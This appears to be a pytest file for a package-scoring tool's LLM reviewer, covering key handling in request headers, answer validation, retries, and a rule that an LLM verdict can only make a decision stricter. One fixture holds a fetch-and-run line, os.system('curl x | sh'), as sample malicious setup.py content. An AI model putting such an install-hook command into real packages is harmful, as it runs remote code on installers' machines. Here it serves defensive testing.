"""Advisory LLM review: request hygiene, answer validation, retries, and stricter-only effect."""
import io
import json
import urllib.error

import pytest

from attesta.scoring import llm
from attesta.scoring.errors import ConfigError, ReviewError
from attesta.scoring.llm import GeminiReviewer
from attesta.scoring.service import ScoringService
from attesta.scoring.settings import ScoringSettings
from attesta.scoring.signer import ScorerSigner
from attesta.scoring.source import SourceBundle
from tests.scoring.helpers import FakeFetcher, FakeModel, FakeSubmitter, FixedAttestation, make_targz
from tests.scoring.test_service import _Extractor

KEY = "AQ.test-key-not-real"
FLAGS = {"flag_network": False}


class _Resp(io.BytesIO):
    def __enter__(self):
        return self

    def __exit__(self, *exc):
        return False


def answer(verdict="BENIGN", reason="fine"):
    text = json.dumps({"verdict": verdict, "reason": reason})
    return json.dumps({"candidates": [{"content": {"parts": [{"text": text}]}}]}).encode()


@pytest.fixture
def reviewer(tmp_path):
    key = tmp_path / "llm_key"
    key.write_text(KEY + "\n")
    return GeminiReviewer("gemini-flash-latest", key, timeout=1, retries=2)


@pytest.fixture(autouse=True)
def no_sleep(monkeypatch):
    monkeypatch.setattr(llm.time, "sleep", lambda _s: None)


def bundle(files):
    return SourceBundle(filename="p.tar.gz", files=files, ecosystem="pypi", package="p", version="1")


def test_request_has_no_tools_a_fixed_schema_and_the_key_only_in_a_header(reviewer, monkeypatch):
    seen = {}

    def fake(request, timeout):
        seen["url"], seen["headers"], seen["body"] = request.full_url, dict(request.header_items()), json.loads(request.data)
        return _Resp(answer("SUSPICIOUS", "downloads and runs a script"))

    monkeypatch.setattr(llm.urllib.request, "urlopen", fake)
    review = reviewer.review(bundle({"p/setup.py": b"os.system('curl x | sh')"}), {"flag_network": True})
    assert review.verdict.value == "SUSPICIOUS" and review.evidence_hash.startswith("sha256:")
    assert KEY not in seen["url"] and KEY not in json.dumps(seen["body"])
    assert seen["headers"]["X-goog-api-key"] == KEY
    body = seen["body"]
    assert "tools" not in body and "toolConfig" not in body
    assert body["generationConfig"]["responseSchema"]["properties"]["verdict"]["enum"] == ["BENIGN", "SUSPICIOUS", "MALICIOUS"]
    prompt = body["contents"][0]["parts"][0]["text"]
    assert "<package>" in prompt and "os.system" in prompt and "UNTRUSTED" in body["systemInstruction"]["parts"][0]["text"]


def test_install_files_come_first_and_text_is_capped(reviewer):
    files = {"p/zzz.py": b"z" * 100, "p/setup.py": b"SETUP", "p/a.py": b"a" * (llm.MAX_CHARS * 2)}
    excerpt = llm._excerpt(bundle(files))
    assert excerpt.index("setup.py") < excerpt.index("a.py") and len(excerpt) < llm.MAX_CHARS + 200


@pytest.mark.parametrize("payload", [
    b"not json", json.dumps({"candidates": []}).encode(), answer("NOT_RUN"), answer("probably fine"),
    json.dumps({"candidates": [{"content": {"parts": [{"text": "{\"verdict\": 1}"}]}}]}).encode(),
])
def test_unusable_answers_are_errors_not_verdicts(reviewer, monkeypatch, payload):
    monkeypatch.setattr(llm.urllib.request, "urlopen", lambda r, timeout: _Resp(payload))
    with pytest.raises(ReviewError):
        reviewer.review(bundle({"a.py": b"x"}), FLAGS)


def test_transient_errors_retry_then_fail_but_client_errors_do_not(reviewer, monkeypatch):
    calls = []

    def http(code):
        def fake(request, timeout):
            calls.append(code)
            raise urllib.error.HTTPError(request.full_url, code, "x", {}, io.BytesIO(b""))
        return fake

    monkeypatch.setattr(llm.urllib.request, "urlopen", http(503))
    with pytest.raises(ReviewError, match="503"):
        reviewer.review(bundle({"a.py": b"x"}), FLAGS)
    assert calls == [503, 503, 503]
    calls.clear()
    monkeypatch.setattr(llm.urllib.request, "urlopen", http(400))
    with pytest.raises(ReviewError, match="400"):
        reviewer.review(bundle({"a.py": b"x"}), FLAGS)
    assert calls == [400]


def test_a_missing_or_empty_key_is_a_config_error(tmp_path):
    with pytest.raises(ConfigError):
        GeminiReviewer("m", tmp_path / "nope")
    (tmp_path / "empty").write_text("\n")
    with pytest.raises(ConfigError):
        GeminiReviewer("m", tmp_path / "empty")


class _Fake:
    def __init__(self, verdict=None, error=False):
        self.verdict, self.error, self.calls = verdict, error, 0

    def review(self, bundle, flags):
        self.calls += 1
        if self.error:
            raise ReviewError("LLM review failed: HTTP 503")
        return llm.Review(llm.LlmVerdict(self.verdict), "sha256:" + "ab" * 32)


def service(policy, scorer_key, reviewer, risk, floor=None):
    fetcher = FakeFetcher()
    fetcher.add_pypi("example-package", "1.0.0", make_targz({"p/setup.py": "x"}))
    return ScoringService(ScoringSettings(), fetcher, FakeModel(risk=risk), _Extractor(), policy,
                          ScorerSigner("k1", scorer_key), FixedAttestation(True), FakeSubmitter(),
                          reviewer=reviewer, floor=floor)


def score(svc):
    return svc.score("pypi", "example-package", "1.0.0", dry_run=True).record


def test_only_borderline_packages_are_reviewed(policy, scorer_key):
    fake = _Fake("BENIGN")
    low = score(service(policy, scorer_key, fake, risk=100))
    assert fake.calls == 0 and low.llm_verdict.value == "NOT_RUN" and low.llm_evidence_hash is None
    mid = score(service(policy, scorer_key, fake, risk=450))
    assert fake.calls == 1 and mid.llm_verdict.value == "BENIGN" and mid.llm_evidence_hash == "sha256:" + "ab" * 32


def test_verdict_can_only_raise_the_decision(policy, scorer_key):
    from attesta.records.trust_record import Decision

    def floor(fields):  # mirrors config/policy.rego for the llm_verdict input
        return {"MALICIOUS": Decision.BLOCK, "SUSPICIOUS": Decision.REVIEW}.get(fields["llm_verdict"], Decision.ALLOW)

    assert score(service(policy, scorer_key, _Fake("MALICIOUS"), 450, floor)).decision.value == "BLOCK"
    assert score(service(policy, scorer_key, _Fake("SUSPICIOUS"), 450, floor)).decision.value == "REVIEW"
    assert score(service(policy, scorer_key, _Fake("BENIGN"), 450, floor)).decision.value == "WARN"   # band's own decision
    assert score(service(policy, scorer_key, _Fake("BENIGN"), 950, floor)).decision.value == "BLOCK"  # never lowered


def test_a_failed_required_review_fails_the_scan(policy, scorer_key):
    with pytest.raises(ReviewError):
        score(service(policy, scorer_key, _Fake(error=True), risk=450))
    score(service(policy, scorer_key, _Fake(error=True), risk=100))  # not required: no call, no failure
